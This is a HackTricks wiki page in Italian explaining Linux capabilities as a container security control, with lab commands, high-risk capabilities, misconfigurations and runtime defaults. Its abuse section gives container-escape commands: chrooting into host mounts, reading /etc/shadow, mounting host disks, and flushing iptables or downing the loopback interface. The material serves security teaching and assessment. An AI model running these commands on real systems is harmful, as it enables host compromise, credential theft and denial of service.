# Capacità di Linux nei container

{{#include ../../../../banners/hacktricks-training.md}}

## Panoramica

Le capability di Linux sono uno degli elementi più importanti nella sicurezza dei container perché rispondono a una domanda sottile ma fondamentale: **cosa significa veramente "root" all'interno di un container?** Su un sistema Linux normale, lo UID 0 storicamente implicava un insieme di privilegi molto ampio. Nei kernel moderni, quel privilegio è scomposto in unità più piccole chiamate capability. Un processo può essere in esecuzione come root e comunque non avere accesso a molte operazioni potenti se le capability rilevanti sono state rimosse.

I container dipendono fortemente da questa distinzione. Molti workload vengono ancora avviati con UID 0 all'interno del container per motivi di compatibilità o semplicità. Senza la rimozione delle capability (capability dropping), ciò sarebbe troppo pericoloso. Con la rimozione delle capability, un processo root containerizzato può comunque eseguire molti normali compiti all'interno del container mentre gli vengono negati operazioni kernel più sensibili. Per questo una shell all'interno del container che mostra `uid=0(root)` non significa automaticamente "host root" o anche "ampio privilegio kernel". Sono gli insiemi di capability a decidere quanto valga realmente quell'identità root.

Per il riferimento completo alle capability di Linux e molti esempi di abuso, vedi:

{{#ref}}
../../linux-capabilities.md
{{#endref}}

## Funzionamento

Le capability sono tracciate in diversi insiemi, inclusi gli insiemi permitted, effective, inheritable, ambient e bounding. Per molte valutazioni sui container, la semantica kernel esatta di ciascun insieme è meno importante immediatamente rispetto alla domanda pratica finale: **quali operazioni privilegiate questo processo può eseguire con successo in questo momento, e quali guadagni di privilegi futuri sono ancora possibili?**

La ragione per cui questo conta è che molte breakout techniques sono in realtà problemi di capability mascherati da problemi di container. Un workload con `CAP_SYS_ADMIN` può accedere a una enorme quantità di funzionalità del kernel che un normale processo root nel container non dovrebbe toccare. Un workload con `CAP_NET_ADMIN` diventa molto più pericoloso se condivide anche lo namespace di rete dell'host. Un workload con `CAP_SYS_PTRACE` diventa molto più interessante se può vedere i processi dell'host tramite la condivisione dei PID dell'host. In Docker o Podman ciò può apparire come `--pid=host`; in Kubernetes di solito appare come `hostPID: true`.

In altre parole, l'insieme di capability non può essere valutato in isolamento. Deve essere interpretato insieme a namespaces, seccomp e MAC policy.

## Laboratorio

Un modo molto diretto per ispezionare le capability all'interno di un container è:
```bash
docker run --rm -it debian:stable-slim bash
apt-get update && apt-get install -y libcap2-bin
capsh --print
```
Puoi anche confrontare un container più restrittivo con uno con tutte le capabilities aggiunte:
```bash
docker run --rm debian:stable-slim sh -c 'grep CapEff /proc/self/status'
docker run --rm --cap-add=ALL debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Per vedere l'effetto di un'aggiunta mirata, prova a rimuovere tutto e riaggiungere solo una capability:
```bash
docker run --rm --cap-drop=ALL --cap-add=NET_BIND_SERVICE debian:stable-slim sh -c 'grep CapEff /proc/self/status'
```
Questi piccoli esperimenti mostrano che un runtime non si limita a commutare un booleano chiamato "privileged". Sta plasmando la superficie di privilegi effettivamente disponibile al processo.

## Capabilities ad alto rischio

Sebbene molte capabilities possano essere rilevanti a seconda dell'obiettivo, alcune sono ripetutamente importanti nell'analisi di container escape.

**`CAP_SYS_ADMIN`** è quella che i difensori dovrebbero trattare con maggiore sospetto. Viene spesso descritta come "the new root" perché sblocca una quantità enorme di funzionalità, incluse operazioni legate a mount, comportamenti sensibili al namespace e molti percorsi del kernel che non dovrebbero mai essere esposti con leggerezza ai container. Se un container ha `CAP_SYS_ADMIN`, seccomp debole e nessun forte confinamento MAC, molte classiche vie di breakout diventano molto più realistiche.

**`CAP_SYS_PTRACE`** conta quando esiste visibilità sui processi, specialmente se il PID namespace è condiviso con l'host o con workload vicini interessanti. Può trasformare la visibilità in tampering.

**`CAP_NET_ADMIN`** e **`CAP_NET_RAW`** sono rilevanti in ambienti focalizzati sulla rete. Su una rete bridge isolata possono già essere rischiose; su un host network namespace condiviso sono molto peggio perché il workload potrebbe riconfigurare l'host networking, sniff, spoof o interferire con i flussi di traffico locali.

**`CAP_SYS_MODULE`** è di solito catastrofica in un ambiente con root perché caricare moduli del kernel equivale a controllo sul kernel dell'host. Dovrebbe quasi mai apparire in un workload container di uso generico.

## Uso del runtime

Docker, Podman, containerd-based stacks, and CRI-O usano tutti capability controls, ma i default e le interfacce di gestione differiscono. Docker li espone molto direttamente tramite flag come `--cap-drop` e `--cap-add`. Podman espone controlli simili e spesso beneficia dell'esecuzione rootless come ulteriore livello di sicurezza. Kubernetes espone aggiunte e rimozioni di capability attraverso il `securityContext` del Pod o del container. Ambienti system-container come LXC/Incus si basano anch'essi sul controllo delle capability, ma la più ampia integrazione con l'host di quei sistemi spesso spinge gli operatori a rilassare i default più aggressivamente di quanto farebbero in un ambiente app-container.

Lo stesso principio vale per tutti: una capability che è tecnicamente possibile concedere non è necessariamente una che dovrebbe essere concessa. Molti incidenti reali iniziano quando un operatore aggiunge una capability semplicemente perché un workload ha fallito con una configurazione più restrittiva e il team aveva bisogno di una fix rapida.

## Malconfigurazioni

L'errore più ovvio è **`--cap-add=ALL`** nelle CLI in stile Docker/Podman, ma non è l'unico. In pratica, un problema più comune è concedere una o due capability estremamente potenti, specialmente `CAP_SYS_ADMIN`, per "far funzionare l'applicazione" senza comprendere anche le implicazioni su namespace, seccomp e mount. Un altro modo comune di fallire è combinare capability aggiuntive con la condivisione dei namespace dell'host. In Docker o Podman questo può apparire come `--pid=host`, `--network=host` o `--userns=host`; in Kubernetes l'esposizione equivalente di solito appare tramite impostazioni del workload come `hostPID: true` o `hostNetwork: true`. Ognuna di queste combinazioni cambia ciò che la capability può effettivamente influenzare.

È anche comune vedere amministratori credere che, perché un workload non è completamente `--privileged`, sia comunque vincolato in modo significativo. A volte è vero, ma a volte la postura effettiva è già abbastanza vicina al privileged che la distinzione smette di avere rilievo operativo.

## Abuso

Il primo passo pratico è enumerare il set di capability effettive e testare immediatamente le azioni capability-specific che potrebbero essere rilevanti per escape o per l'accesso a informazioni dell'host:
```bash
capsh --print
grep '^Cap' /proc/self/status
```
Se `CAP_SYS_ADMIN` è presente, testa prima mount-based abuse e host filesystem access, perché questo è uno dei breakout enablers più comuni:
```bash
mkdir -p /tmp/m
mount -t tmpfs tmpfs /tmp/m 2>/dev/null && echo "tmpfs mount works"
mount | head
find / -maxdepth 3 -name docker.sock -o -name containerd.sock -o -name crio.sock 2>/dev/null
```
Se `CAP_SYS_PTRACE` è presente e il container può vedere processi interessanti, verifica se la capability può essere trasformata in ispezione dei processi:
```bash
capsh --print | grep cap_sys_ptrace
ps -ef | head
for p in 1 $(pgrep -n sshd 2>/dev/null); do cat /proc/$p/cmdline 2>/dev/null; echo; done
```
Se `CAP_NET_ADMIN` o `CAP_NET_RAW` è presente, verifica se il carico di lavoro può manipolare lo stack di rete visibile o almeno raccogliere informazioni di rete utili:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
```
When un test di capability ha esito positivo, combinalo con la situazione dei namespace. Una capability che sembra soltanto rischiosa in un namespace isolato può diventare immediatamente un'escape o una primitive di host-recon quando il container condivide anche host PID, host network o host mounts.

### Esempio completo: `CAP_SYS_ADMIN` + Host Mount = Host Escape

Se il container ha `CAP_SYS_ADMIN` e un bind mount scrivibile del filesystem host come `/host`, il percorso di escape è spesso diretto:
```bash
capsh --print | grep cap_sys_admin
mount | grep ' /host '
ls -la /host
chroot /host /bin/bash
```
Se `chroot` riesce, i comandi vengono ora eseguiti nel contesto del filesystem root dell'host:
```bash
id
hostname
cat /etc/shadow | head
```
Se `chroot` non è disponibile, lo stesso risultato può spesso essere ottenuto invocando il binario attraverso l'albero montato:
```bash
/host/bin/bash -p
export PATH=/host/usr/sbin:/host/usr/bin:/host/sbin:/host/bin:$PATH
```
### Esempio completo: `CAP_SYS_ADMIN` + Accesso al dispositivo

Se un dispositivo a blocchi dell'host è esposto, `CAP_SYS_ADMIN` può trasformarlo in accesso diretto al filesystem dell'host:
```bash
ls -l /dev/sd* /dev/vd* /dev/nvme* 2>/dev/null
mkdir -p /mnt/hostdisk
mount /dev/sda1 /mnt/hostdisk 2>/dev/null || mount /dev/vda1 /mnt/hostdisk 2>/dev/null
ls -la /mnt/hostdisk
chroot /mnt/hostdisk /bin/bash 2>/dev/null
```
### Esempio completo: `CAP_NET_ADMIN` + Host Networking

Questa combinazione non produce sempre direttamente host root, ma può riconfigurare completamente lo stack di rete dell'host:
```bash
capsh --print | grep cap_net_admin
ip addr
ip route
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link set lo down 2>/dev/null
iptables -F 2>/dev/null
```
Questo può abilitare denial of service, traffic interception, o l'accesso a servizi che erano precedentemente filtrati.

## Verifiche

Lo scopo delle verifiche delle capability non è solo eseguire il dump dei valori grezzi ma capire se il processo ha sufficienti privilegi per rendere pericolosa la sua attuale situazione di namespace e mount.
```bash
capsh --print                    # Human-readable capability sets and securebits
grep '^Cap' /proc/self/status    # Raw kernel capability bitmasks
```
Quello che è interessante qui:

- `capsh --print` è il modo più semplice per individuare capabilities ad alto rischio come `cap_sys_admin`, `cap_sys_ptrace`, `cap_net_admin`, o `cap_sys_module`.
- La linea `CapEff` in `/proc/self/status` mostra ciò che è effettivamente attivo ora, non solo ciò che potrebbe essere disponibile in altri set.
- Un dump delle capability diventa molto più importante se il container condivide anche i namespace PID, network o user dell'host, o ha mount host scrivibili.

Dopo aver raccolto le informazioni raw sulle capability, il passo successivo è l'interpretazione. Verifica se il processo è root, se i user namespaces sono attivi, se i namespace dell'host sono condivisi, se seccomp è in enforcing, e se AppArmor o SELinux limitano ancora il processo. Un set di capability da solo è solo una parte della storia, ma spesso è la parte che spiega perché un container breakout funziona e un altro fallisce con lo stesso apparente punto di partenza.

## Valori predefiniti del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Modifiche manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Reduced capability set by default | Docker keeps a default allowlist of capabilities and drops the rest | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--cap-add=ALL`, `--privileged` |
| Podman | Reduced capability set by default | Podman containers are unprivileged by default and use a reduced capability model | `--cap-add=<cap>`, `--cap-drop=<cap>`, `--privileged` |
| Kubernetes | Inherits runtime defaults unless changed | If no `securityContext.capabilities` are specified, the container gets the default capability set from the runtime | `securityContext.capabilities.add`, failing to `drop: [\"ALL\"]`, `privileged: true` |
| containerd / CRI-O under Kubernetes | Usually runtime default | The effective set depends on the runtime plus the Pod spec | same as Kubernetes row; direct OCI/CRI configuration can also add capabilities explicitly |

Per Kubernetes, il punto importante è che l'API non definisce un unico set di capability predefinito universale. Se il Pod non aggiunge o rimuove capability, il workload eredita il default del runtime per quel nodo.
{{#include ../../../../banners/hacktricks-training.md}}
